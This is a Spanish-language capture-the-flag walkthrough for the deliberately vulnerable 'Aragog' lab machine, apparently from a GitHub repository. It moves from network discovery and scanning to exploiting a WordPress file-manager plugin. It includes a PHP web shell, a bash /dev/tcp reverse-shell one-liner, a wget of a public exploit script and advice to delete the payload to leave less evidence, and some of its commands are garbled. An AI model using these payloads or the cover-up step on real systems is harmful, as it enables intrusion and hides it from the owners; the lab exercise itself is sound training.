## Maquina aragog 
Empezamos con la máquina Aragog, ya que es la que se encuentra en nuestra red. Primero debemos encontrarla y para ello necesiatremos convertirnos en root.
Si quieres aprender a vulnerarla sigue los pasos como se indican.

# 1. RED

```
sudo nano /etc/network/interface
```
Nos tiene que quedar como se muestra la imagen.
![Captura de pantalla 2024-02-27 193951](https://github.com/Vicctoriaa/VISMA/assets/153718557/44a1151b-10f4-4293-9d0d-6758bdec6e69)

En caso de que queramos saber que hemos puesto en la interface podemos utilizar el siguiente comando:

```
cat /etc /network/interface
```

Reiniciamos la maquina, y nos dirigimos a nuestra maquina principal es importante tener la Aragog encendida para que nos encuentre la ip, para saber que ip tiene escanearemos la red 
poniendo el siguiente comando:
```
arp-scan -I ens33 –localnet 
```
Si solamenente queremos buscar la maquina, y estamos usando VmWare podremos añadirle el comando `grep` y entre comillas pondremos lo siguiente:
```
arp-scan -I ens33 –localnet | grep "VMware, Inc."
```
![segunda cap_arp scan](https://github.com/Vicctoriaa/VISMA/assets/153718557/0adfdaf6-8c45-4ebb-8f52-129be138e098)
‎ ‎ ‎ 
‎ ‎ ‎ ‎ 
‎ 
‎ 
# 2. ATAQUE

Revisaremos si la maquina se encunetra activa o si hay algun firewall bloqueando las trazas ICMP, para ello debermos hacer un `ping`. 

```
ping -c 1 IP_DE_LA_ARAGOG
```
![tercera cap_ping](https://github.com/Vicctoriaa/VISMA/assets/153718557/a16ed55c-d8de-43e8-aeab-ed765bd07e2c)

Una vez le hemos mandado un ping, podemos revisar que la máquina esta encendida, también vemos que el ttl = 64 por lo que es una máquina Linux, si el ttl es “=” o menor a 64 quiere decir, que probablemente estamos ante una máquina Linux. 
Podemos observar también que ningún paquete a sido descartado, entonces ya sabemos que esta en el mismo segmento de red y esta preparada para ser vulnerada.

Una vez tengamos esa información, deberemos hacer un escaneo de puertos para ello utilizaremos la herramienta nmap, especializada en escanear puertos, pondremos parametros ya que queremos solamente cosas especificas. (si quieres saber sobre los parámetros entra aqui:.....)
```
nmap -sS -p --open -T5 --min-rate 5000 IP_DE_LA_ARAGOG -n -Pn -vvv -oG
```
![4 cap_nmap1](https://github.com/Vicctoriaa/VISMA/assets/153718557/9f0cecac-277b-46ab-96c7-0a7fdd210233)

Una vez hemos acabado con el escaneo de puertos ahora debemos detectar que servicios o versiones están corriendo en estos puertos, para ello una vez tenemos los puertos abiertos copiados a la clipboard
```
nmap -sCV -p22,80 IP_DE_LA_ARAGOG -oN portServices
```

![5 cap_nmap2](https://github.com/Vicctoriaa/VISMA/assets/153718557/801bb9f3-6416-44bd-a619-4440f6e2bd8a)

hecho el escaneo encontramos que el puerto 22 está corriendo ssh, pero como no tenemos ninguna clave de momento no podemos hacer nada y un ataque de fuerza bruta tardaríamos bastante, por lo que lo dejamos como ultima opción. Encontramos que en el puerto 80 está corriendo apache, lo que quiere decir que hay una web corriendo por detrás.

Si buscamos la ip de la máquina (192.168.1.62) con el puerto 80 encontramos lo siguiente

![6 cap_ipnavegadorWEB](https://github.com/Vicctoriaa/VISMA/assets/153718557/7f000f25-3155-43a7-8403-493871ef5ca3)

De primeras no vemos nada que nos llame la atención así que vamos a ver el código fuente para ver si hay algo interesante, para ello hacermos click en ctrl + u

![7 cap_ctrl_U_web](https://github.com/Vicctoriaa/VISMA/assets/153718557/1aee44e7-258b-4fa8-8144-20a09f3a22a8)

Y no encontramos nada. Lo siguiente a probar sería los subdominios, pero aquí no tenemos dominio ni servidor dns al que preguntarle los posibles subdominios o subdominios indexados por el certificado ssl. Así que haremos fuzzing, esto nos servirá para poder determinar si se encuentra algún directorio escondido dentro del servidor web. Para ello utilizaremos `gobuster`, aunque también podemos utilizar herramientas como `fuff` o `wfuzz`.
( En caso que no este instalado puedes ver como se instala aqui ...... y para saber que es cada parámetro entra aquí .......)
```
gobuster dir -u http://IP_DE_LA_ARAGOG:80 -w /usr/share/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x html,php,jpg,png,png,txt,docx,pdf 2>/dev/null
```
![8 cap_gobuster1](https://github.com/Vicctoriaa/VISMA/assets/153718557/36899e51-7b8a-491c-96d1-059992d80b2d)

Una vez finalizado el escaneo encontramos que el directorio “/blog” y “/javascript” Nos redirigen haca otro lado mientras “/server-status” nos devuelve un 403 (el servidor recibe la petición pero deniega el acceso a la acción), si entramos a java script, nos dará un error llamado FORBIDDEN, en cambio si entramos a blog vemos la web 

![9 cap_web blog](https://github.com/Vicctoriaa/VISMA/assets/153718557/30f6ed9f-d43e-412f-b8f2-8c3b7a7ff6cf)

Podemos observar que es una páquina Wordpress[^1], pero por alguna razón la web no esta cargando los estilos “css”[^2] , por lo que antes vamos a revisar el código fuente.
Primero en busca de comentarios de algún desarrollador que nos de información valiosa y después buscaremos en el "head" para ver que ocurre y poque no llama bien al estilo css, como hicimos anteriormente, ctrl + u

![10 cap_CSS](https://github.com/Vicctoriaa/VISMA/assets/153718557/aff25656-3d4f-40ba-9d19-e90a5d6bd107)

Ya que llama los estilos desde un dominio, para poder resolverlo debemos añadir el dominio wordpress.aragog.hogwarts y aragog.hogwarts, para que nuestro pc sea capaz de resolver el dominio, en el siguiente directorio:
```
sudo nano /etc/hosts
```
![11 cap_poner dominio CSS](https://github.com/Vicctoriaa/VISMA/assets/153718557/7465ef38-2401-4c8a-ba4b-d621605aa587)

Ahora si buscamos el dominio “wordpress.aragog.hogwarts” en el navegador nos resuelve la web correcamente

Esto es lo que nos reporta wappalyzer[^3], sobre la web

![12_wappalyzer](https://github.com/Vicctoriaa/VISMA/assets/153718557/d465f016-a542-4141-a915-3378df7a6d5a)

Podemos ver que esta pagina tiene wordpress, si intentamos entrar en el directorio “wp-content” 
```
http://wordpress.aragog.hogwarts/blog/wp-content/
```

Para ver si tenemos directory listing, para poder tener directory listing en una web se deben cumplir los siguientes requisitos:
* No contiene un archivo llamado “index.html”
* Y no contiene un archivo “.htacces”, este archivo sirve para bloquear el acceso al directory listing como tal.

Como lo que queríamos era buscar plugions de wordpress que fuesen vulnerables probaremos con otra herramienta llamada `WPscan`[^4]
```
-wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --plugin-detection agressive --api-token=$wpapi
```
Podemos encontrar que ha detectado varios plugins con vulnerabilidades, pero de todos esos el que mas me llama la atención es uno que me permite subir archivos de sin autenticarme y que de ahí puede derivar en una ejecución remota de comandos.
En esta [web](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/) nos dejan un POC (proof of concept) donde entro de este tenemos el script en Python que nos permite subir archivos remotamente.
Para descargarlo haremos un `wget` del archivo
```
wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
```
Si hacemos un `cat` mas el archivo que acabamos de instalar podemos ver el código python y entender cuál es su función.

Creamos un archivo llamado `payload.php` dónde agregaremos las siguientes líneas.
```
sudo nano payload.php
```
Dónde agregaremos las siguientes líneas.
```php
<?php
echo "<pre>" . shell.exec($_REQUEST['cmd']) . "</pre>";
?>
```
Guardamos (ctrl + s) y salimos (ctrl + x)
Ahora hemos de juntar el escript en la url de la web, poniendo el siguiente comando.
```
python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
```
Si entramos a la url : `http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php` no nos mostrará nada ya que hemos de poner un comando al final del link añadiendole al final de la url `cmd=COMANDO_QUE_QUERAMOS`

![13 cap_cmdURL](https://github.com/Vicctoriaa/VISMA/assets/153718557/ae1e931c-e063-453a-8bf3-98313735ba11)
> En este ejemplo se muestra el comando `hostname -l` que nos dice la ip

Una vez hemos verificado que tiene 2 interfaces de red vamos a entablar una reverse Shell.
Para ello nos vamos al puerto 443 y ponemos un one liner para una reverse Shell:
```
bash -c "bash -i >& /dev/tcp/IP_DE_LA_ARAGOG/443 0>&1"
```
Una vez ejecutamos el comando podemos observar que hemos obtenido una reverse shell
```
nc -nvlp 443
```
esta Shell no es del todo interactiva ya que no podemos hacer ctrl c, ctrl l, ctrl u, no podemos utilizar las flechas para ir al historial de comandos, etc...
Para solucionar esto se hace un tratamiento de la tty, con tratamiento de la tty básicamente nos referimos a la configuración y gestión de la terminal.
Para ello hay que hacer los siguientes comandos
```
‎script /dev/null -c bash
```
ctrl + z
```
stty raw -echo; fg
reset xterm
```
‎Una vez hecho esto solo nos queda resetear el tamaño de la terminal, para eso primero debemos saber el tamaño de nuestra terminal por lo que en una terminal aparte ejecutamos el comando `stty size`

Reseteamos la Variable de entrno TERM para que sea igual a “xterm”, xterm es un emulador de terminal muy utilizado que es el que nos permite limpiar pantalla con las hotkeys “ctrl + L” usar “ctrl + C”, poder usar las flechas para moverse, etc.
‎
```
expot TERM=xterm s$ -sitty rows 64 columns 253wordpress/wp-content/plugins/wp-file-manager/lib/files
```
Una vez hecho eso reseteamos el tamaño de la terminal a nuestro tamaño de la ventana y ya está. Ya tenemos una reverse Shell totalmente interactiva que si hacemos “ctrl + c” no se nos cierra.

Nos dirigimos a home, en caso de que no estemos dentro hacemos `cd /home/`
al hacer `ls` vemos un directorio llamado hagrid98, si repetimos el comando `ls` vemos el .txt, para verlo haremos `cat horcrux1.txt`
‎ 
Nos encontramos que esta en base64, por lo que para pasarlo a texto legible o “human readable” debemos de ejecutar el comando:
```
echo “texto en base 64” | base64 -d; echo
```
> El -d es para decodearlo y el echo del final es para reiniciar la salida

![14 cap_hagrid](https://github.com/Vicctoriaa/VISMA/assets/153718557/115ac27c-5cd2-4c13-a780-3ba85437b622)

Buscaremos si encontramos algo útil, como esta corriendo apache debemos buscar el directorio de apache que `“/etc/apache2”` una vez dentro encontramos que hay un directorio llamado `“sites-enabled”` entramos y dentro hay un wordpress.conf, al hacerle un `cat` nos revela que el directorio donde esta montado el wordpress es `“/usr/share/wordpress”` si entramos, encontramos que hay un direcorio interesante llamado `“wp-content”`, si entramos y nos dirigimos a `plugins>wp-file-manager>lib>files` encontramos nuestro `payload.php`, de momento no lo borraremos porque sin el no podemos tener la reverse Shell, pero una vez escalemos y tengamos conexión por ssh debemos borrarlo para dejar menos evidencias.
```
cd /etc/apache2/sites/enabled
cat worpress.conf
```
```
cd /usr/share/wordpress & ls
```
```
cd /plugins/wp-file-manager/lib/files
```

Una vez dentro con el comando `ls` podemos ver que hay una archivo `wp-config.php`, nos fijaremos en lo que hay dentro de el como hemos hecho anterior mente utilizando el comando `cat`.
```
cat wp-config-php
```
Se mostrará un archivo como el que veremos a continuación:

```php
<?php
/***
 * WordPress's Debianised default master config file
 * Please do NOT edit and learn how the configuration works in
 * /usr/share/doc/wordpress/README.Debian
 ***/

/* Look up a host-specific config file in
 * /etc/wordpress/config-<host>.php or /etc/wordpress/config-<domain>.php
 */
$debian_server = preg_replace('/:.*/', "", $_SERVER['HTTP_HOST']);
$debian_server = preg_replace("/[^a-zA-Z0-9.\-]/", "", $debian_server);
$debian_file = '/etc/wordpress/config-'.strtolower($debian_server).'.php';
/* Main site in case of multisite with subdomains */
$debian_main_server = preg_replace("/^[^.]*\./", "", $debian_server);
$debian_main_file = '/etc/wordpress/config-'.strtolower($debian_main_server).'.php';

if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

/* Default value for some constants if they have not yet been set
   by the host-specific config files */
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP_CORE_UPDATE'))
    define('WP_CORE_UPDATE', false);
if (!defined('WP_ALLOW_MULTISITE'))
    define('WP_ALLOW_MULTISITE', true);
if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');
if (!defined('DB_HOST'))
    define('DB_HOST', 'localhost');
if (!defined('WP_CONTENT_DIR') && !defined('DONT_SET_WP_CONTENT_DIR'))
    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');

/* Default value for the table_prefix variable so that it doesn't need to
   be put in every host-specific config file */
if (!isset($table_prefix)) {
    $table_prefix = 'wp_';
}

if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
    $_SERVER['HTTPS'] = 'on';

require_once(ABSPATH . 'wp-settings.php');
?>
```


Observamos que el archivo nombra un `“/etc/wordpress/config-default.php"`, lo que garemos será investigarlo al no estar seguros de lo que contiene y no queremos perder nada 


#===============================MIS-REDES==================================#

Practicamente VISMA en todos lados

https://www.youtube.com/

https://www.twitter.com/

https://www.tiktok.com/

https://www.twitch.tv/

https://www.instagram.com/

#=========================================================================#

[^1]: cuenta con Wordpress Comenter y Wp-Admin que es un usuario muy común de wordpress aparte de que pone “Proudly powered by Wordpress”.
[^2]: lenguaje que maneja el diseño y presentación de las páginas web, es decir, cómo lucen cuando un usuario las visita.
[^3]: inspecciona los datos internos de las webs, identificando la programación que se ha utilizado para desarrollarla, también es una extensión que hemos de añadir buscandola directamente desde internet. 
[^4]: herramienta especializada en escanear páginas de wordpress en busca de vulnerabilidades.
[^5]: interfaz de usuario de línea de comandos particular que se utiliza para comunicarse con el núcleo de Linux
